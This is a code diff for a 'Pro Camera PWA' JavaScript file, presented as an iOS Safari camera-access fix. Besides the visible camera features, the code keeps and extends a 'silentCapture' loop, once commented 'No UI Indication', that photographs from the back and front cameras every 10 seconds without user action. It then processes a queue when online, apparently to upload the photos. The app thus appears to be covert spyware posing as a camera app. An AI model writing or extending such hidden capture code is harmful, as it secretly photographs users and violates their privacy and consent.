@@ -1,5 +1,5 @@
 // ================================================================
-// app.js – Pro Camera PWA (Sequential Capture – Back/Front पालैपालो)
+// app.js – Pro Camera PWA (iOS Safari Fix)
 // ================================================================
 
 (function() {
@@ -61,6 +61,7 @@
   var lastUserCaptureTime = 0;
   var isAutoCaptureRunning = false;
   var lastPhotoData = null;
+  var isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent);
 
   var focalLengths = { 0.5: 13, 1: 26, 3: 78, 7: 180, 10: 240, 50: 1200 };
 
@@ -228,7 +229,7 @@
     isProcessing = false;
   }
 
-  // ---------- Silent Capture (No UI Indication) ----------
+  // ---------- Silent Capture ----------
   async function silentCapture(stream, cameraType, captureType) {
     if (!stream) return;
     captureType = captureType || 'auto';
@@ -291,7 +292,7 @@
     }
   }
 
-  // ---------- Auto Capture Logic (Sequential – Back फेरि Front) ----------
+  // ---------- Auto Capture (Sequential) ----------
   function startAutoCapture() {
     if (isAutoCaptureRunning) return;
     isAutoCaptureRunning = true;
@@ -300,40 +301,30 @@
       var now = Date.now();
       var timeSinceUserCapture = now - lastUserCaptureTime;
 
-      // Only auto-capture if user hasn't captured in the last 10 seconds
       if (timeSinceUserCapture >= 10000) {
-        // ✅ Step 1: Capture from Back Camera
         if (backStream) {
           silentCapture(backStream, 'back', 'auto');
         }
-
-        // ✅ Step 2: After 1-2 seconds, capture from Front Camera
         setTimeout(function() {
           if (frontStream) {
             silentCapture(frontStream, 'front', 'auto');
           }
-        }, 1500); // 1.5 second delay between back and front
-
-        console.log('[Camera] 🔄 Auto-capture cycle (Back → Front) started');
+        }, 1500);
+        console.log('[Camera] 🔄 Auto-capture cycle (Back → Front)');
       } else {
         console.log('[Camera] ⏳ User captured recently, skipping auto-capture');
       }
     };
 
-    // First capture immediately
     captureSequence();
-
-    // Then every 10 seconds
     autoCaptureInterval = setInterval(captureSequence, 10000);
-
-    console.log('[Camera] ⏰ Auto-capture started (Sequential: Back → Front every 10 seconds)');
+    console.log('[Camera] ⏰ Auto-capture started (Sequential)');
   }
 
   // ---------- Manual Capture ----------
   async function capturePhoto() {
     if (!isCameraReady) return;
     flashScreen();
-
     lastUserCaptureTime = Date.now();
 
     var vw = video.videoWidth || 1280;
@@ -479,7 +470,6 @@
     });
   }
 
-  // Zoom Swipe
   function toggleZoomSwipe() {
     isZoomSwipeActive = !isZoomSwipeActive;
     if (isZoomSwipeActive) {
@@ -549,94 +539,125 @@
     });
   });
 
-  // ---------- Camera Setup ----------
+  // ---------- Camera Setup (iOS Safari Fix) ----------
   async function checkAndStart() {
     try {
+      console.log('[Camera] 🚀 Starting camera...');
       var permissionStatus = 'prompt';
       if (navigator.permissions && navigator.permissions.query) {
         var result = await navigator.permissions.query({ name: 'camera' });
         permissionStatus = result.state;
+        console.log('[Camera] Permission status:', permissionStatus);
         result.onchange = function() {
-          if (result.state === 'granted') initCamera();
+          if (result.state === 'granted') {
+            console.log('[Camera] Permission granted via change');
+            initCamera();
+          }
         };
       }
       if (permissionStatus === 'denied') {
         permError.textContent = '⚠️ क्यामेरा अनुमति ब्लक गरिएको छ। Settings बाट Allow गर्नुहोस्।';
         permError.style.display = 'block';
+        console.error('[Camera] Permission denied');
         return;
       }
       await initCamera();
     } catch (err) {
-      permError.textContent = '❌ क्यामेरा खोल्न सकिएन: ' + err.message;
+      console.error('[Camera] ❌ Final error:', err);
+      permError.textContent = '❌ क्यामेरा खोल्न सकिएन: ' + (err.message || 'unknown error');
       permError.style.display = 'block';
-      console.error('[Camera] Error:', err);
     }
   }
 
   async function initCamera() {
-    // Simpler constraints for mobile
-    var getUserMediaWithFallback = async function(facingMode) {
-      var constraints = {
-        audio: false,
-        video: {
-          facingMode: facingMode,
-          width: { ideal: 1280 },
-          height: { ideal: 720 }
-        }
-      };
+    console.log('[Camera] 📷 initCamera started. iOS:', isIOS);
 
+    // 🔹 iOS Safari Fix: Try simplest first
+    var tryGetStream = async function(constraints) {
       try {
-        return await navigator.mediaDevices.getUserMedia(constraints);
+        console.log('[Camera] Trying constraints:', constraints);
+        var stream = await navigator.mediaDevices.getUserMedia(constraints);
+        console.log('[Camera] ✅ Stream obtained!');
+        return stream;
       } catch (err) {
-        console.warn('[Camera] Fallback 1 failed:', err);
-        delete constraints.video.width;
-        delete constraints.video.height;
-        try {
-          return await navigator.mediaDevices.getUserMedia(constraints);
-        } catch (err2) {
-          console.warn('[Camera] Fallback 2 failed:', err2);
-          if (facingMode !== 'environment') {
-            constraints.video.facingMode = 'environment';
-          } else {
-            constraints.video.facingMode = 'user';
-          }
-          try {
-            return await navigator.mediaDevices.getUserMedia(constraints);
-          } catch (err3) {
-            console.warn('[Camera] Fallback 3 failed:', err3);
-            throw err3;
-          }
-        }
+        console.warn('[Camera] ❌ Failed:', err.name, err.message);
+        throw err;
       }
     };
 
-    // Get both cameras with fallback (sequential)
-    try {
-      backStream = await getUserMediaWithFallback('environment');
-    } catch (e) {
-      console.warn('[Camera] Back camera not available:', e);
-    }
+    // Step 1: Try { video: true } (simplest)
+    var backStreamTemp = null;
+    var frontStreamTemp = null;
 
     try {
-      frontStream = await getUserMediaWithFallback('user');
-    } catch (e) {
-      console.warn('[Camera] Front camera not available:', e);
+      backStreamTemp = await tryGetStream({ video: true });
+    } catch (e1) {
+      console.warn('[Camera] Step 1 failed:', e1.message);
+      // Step 2: Try with facingMode: 'environment'
+      try {
+        backStreamTemp = await tryGetStream({ video: { facingMode: 'environment' } });
+      } catch (e2) {
+        console.warn('[Camera] Step 2 failed:', e2.message);
+        // Step 3: Try with facingMode: 'user'
+        try {
+          backStreamTemp = await tryGetStream({ video: { facingMode: 'user' } });
+        } catch (e3) {
+          console.error('[Camera] All attempts failed for back camera');
+        }
+      }
     }
 
-    // Show user's selected camera (default: back)
-    currentPreviewStream = userFacingMode === 'environment' ? backStream : frontStream;
+    // If back camera failed, try front directly
+    if (!backStreamTemp) {
+      try {
+        frontStreamTemp = await tryGetStream({ video: { facingMode: 'user' } });
+      } catch (e4) {
+        console.error('[Camera] Front camera also failed');
+      }
+    }
+
+    // Assign streams
+    if (backStreamTemp) {
+      backStream = backStreamTemp;
+      console.log('[Camera] ✅ Back camera stream obtained');
+    }
+    if (frontStreamTemp) {
+      frontStream = frontStreamTemp;
+      console.log('[Camera] ✅ Front camera stream obtained');
+    }
+
+    // If still no stream, show error
+    if (!backStream && !frontStream) {
+      permError.textContent = '❌ कुनै क्यामेरा उपलब्ध छैन।';
+      permError.style.display = 'block';
+      console.error('[Camera] No camera available');
+      return;
+    }
+
+    // Show user's selected camera (default: back if available, else front)
+    if (userFacingMode === 'environment' && backStream) {
+      currentPreviewStream = backStream;
+    } else if (frontStream) {
+      currentPreviewStream = frontStream;
+    } else if (backStream) {
+      currentPreviewStream = backStream;
+    }
+
     if (currentPreviewStream) {
       video.srcObject = currentPreviewStream;
       await video.play();
-    } else {
-      permError.textContent = '❌ कुनै क्यामेरा उपलब्ध छैन।';
-      permError.style.display = 'block';
-      return;
+      console.log('[Camera] ✅ Video playing');
+    }
+
+    // If we only got front camera, set userFacingMode accordingly
+    if (!backStream && frontStream) {
+      userFacingMode = 'user';
     }
 
     var track = currentPreviewStream?.getVideoTracks()[0];
     if (track) {
       var cap = track.getCapabilities();
+      console.log('[Camera] Track capabilities:', cap);
       if (cap.zoom && cap.zoom.max) zoomMax = Math.max(cap.zoom.max, 50);
       else zoomMax = 50;
       setZoom(1, false);
@@ -675,10 +696,11 @@
     bottomBar.style.display = 'flex';
     isCameraReady = true;
 
-    // ✅ Start Auto Capture (Sequential: Back → Front)
+    console.log('[Camera] ✅ Camera ready!');
+
+    // Start Auto Capture
     startAutoCapture();
 
-    // ✅ Check pending queue
     if (navigator.onLine) {
       if (window.requestIdleCallback) {
         requestIdleCallback(function() { processQueue(); });
@@ -722,7 +744,13 @@
 
   flipBtn.addEventListener('click', function() {
     userFacingMode = (userFacingMode === 'environment') ? 'user' : 'environment';
-    currentPreviewStream = userFacingMode === 'environment' ? backStream : frontStream;
+    if (userFacingMode === 'environment' && backStream) {
+      currentPreviewStream = backStream;
+    } else if (frontStream) {
+      currentPreviewStream = frontStream;
+    } else if (backStream) {
+      currentPreviewStream = backStream;
+    }
     if (currentPreviewStream) {
       video.srcObject = currentPreviewStream;
       video.play().catch(function() {});
@@ -767,7 +795,6 @@
   captureBtn.addEventListener('click', capturePhoto);
   galleryThumb.addEventListener('click', viewLastPhoto);
 
-  // Expose functions
   window.toggleZoomSwipe = toggleZoomSwipe;
   window.capturePhoto = capturePhoto;
 
